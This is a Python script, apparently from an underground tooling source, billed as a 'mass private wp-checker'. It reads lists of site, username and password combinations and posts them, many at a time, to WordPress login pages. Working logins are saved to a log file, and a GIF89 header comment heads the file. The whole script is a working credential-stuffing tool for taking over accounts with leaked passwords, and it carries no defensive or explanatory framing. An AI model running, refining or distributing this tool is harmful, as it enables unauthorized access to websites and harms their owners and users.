# <!-- GIF89;a -->
# thanks to @dandierexploit

import os
import re
import sys
from multiprocessing.dummy import Pool as ThreadPool
from requests import request
from colorama import Fore, init
from pystyle import *
init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN
frs = Fore.RESET

banner = f'''
                   `-/+osssssssssssso+/-`
               ./oys+:.`            `.:+syo/.
            .+ys:.   .:/osyyhhhhyyso/:.   ./sy+.
          /ys:   -+ydmmmmmmmmmmmmmmmmmmdy+-   :sy/
        /h+`  -odmmmmmmmmmmmmmmmmmmmmmmmmmmdo-  `+h/
      :ho`  /hmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmds/   `oh:
    `sy.  /hmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmd+        .ys`
   .ho  `sdddhhhyhmmmdyyhhhdddddhhhyydmmmmy           oh.
  .h+          ``-dmmy.``         ``.ymmmmh            +h.
 `ho  `       /mmmmmmmmmmo       .dmmmmmmmms        ~~  oh`
 oy  .h`       ymmmmmmmmmm:       /mmmmmmmmmy`      -d.  yo
.d-  ymy       `dmmmmmmmmmd.       ymmmmmmmmmh`     /my  -d.
oy  -mmm+       /mmmmmmmmmmy       .dmmmmmmmmmy     ymm-  yo
h+  +mmmd-       smmmmmmmmmm+       /mmmmmmmmmm-   :mmm+  +h
d/  smmmmh`      `dmmmmmmmmmd`       smmmmmmmmm:  `dmmms  /d
d/  smmmmms       :mmmmmmmmm+        `dmmmmmmmd.  smmmms  /d
h+  +mmmmmm/       smmmmmmmh  +       /mmmmmmmy  /mmmmm+  +h
oy  -mmmmmmd.      `dmmmmmd- +m/       smmmmmd. .dmmmmm-  yo
.d-  ymmmmmmh       :mmmmm+ .dmd-      `dmmmm/  ymmmmmy  -d.
 oy  .dmmmmmmo       smmmh  hmmmh`      :mmmy  +mmmmmd.  yo
 `ho  -dmmmmmd:      `dmd- ommmmms       smd- .dmmmmd-  oh`
  .h+  -dmmmmmd`      :m+ -dmmmmmm:      `do  hmmmmd-  +h.
   .ho  .ymmmmmy       + `hmmmmmmmd.      :` ommmmy.  oh.
    `sy.  /hmmmm+        ommmmmmmmmy        -dmmh/  .ys`
      :ho`  /hmmd-      :mmmmmmmmmmmo      `hmh/  `oh:
        /h+`  -odh`    `dmmmmmmmmmmmd:     oo-  `+h/
          /ys:   ~~    smmmmmmmmmmmmmd`       :sy/
            .+ys/.    `/osyyhhhhyyso/:`   ./sy+.
               ./oys+:.`            `.:+syo/.
                   `-/+osssssssssssso+/-`


[!] mass private wp-checker

[Type]: url#user@pass
        url|user|pass
'''

headers = { 
    'User-Agent'  : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept'      : 'text/plain'
} 

def check(url):
    try:
        site, user, passwd = '', '', ''

        if '@' in url and '#' in url:
            site = url.split("#")[0]
            user = url.split("#")[1].split("@")[0]
            passwd = url.split("#")[1].split("@")[1]
        elif url.count('|') == 2:
            data_split = url.split("|")
            site = data_split[0]
            user = data_split[1]
            passwd = data_split[2]
        else:
            raise ValueError("Invalid URL format > " + url)

    except Exception as e:
        print(f' -| Error: {e}')
        return

    try:
        resp = request(method='POST', url=site, headers=headers, data={
            'log': user,
            'pwd': passwd,
            'wp-submit': 'Log In'
        }, timeout=5).text

      #'  if 'Dashboard' in resp and 'Add New Plugin' in resp: 
       
        if 'Dashboard' in resp:
            print(' -| {:<50} --> {}[Login Successfully]'.format(url, fg))
            open("Logg-Wordpress.txt", "a").write(f"{site}#{user}@{passwd}\n")            
        else:
            print(' -| {:<50} --> {}[Login Failed]'.format(site, fr))

    except Exception as e:
        print(' -| {:<50} --> {}[Error]'.format(site, fr))

if __name__ == "__main__":
    try:
        with open(sys.argv[1], 'r') as file:
            lines = file.read().splitlines()

        pp = ThreadPool(int(sys.argv[2]))
        results = pp.map(check, lines)
        pp.close()
        pp.join()

    except IndexError:
        path = str(sys.argv[0]).split('/')
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter(banner + '\n [!] Enter <' + path[len(path) - 1] + '> <sites.txt> <thread>'+ '\n [*] Contoh: ' + path[len(path) - 1] + ' list.txt 50')))
        sys.exit(1)

    except FileNotFoundError:
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter('\n\n  [!] File >' + sys.argv[1] + '< tidak di temukan!')))
        sys.exit(1)
        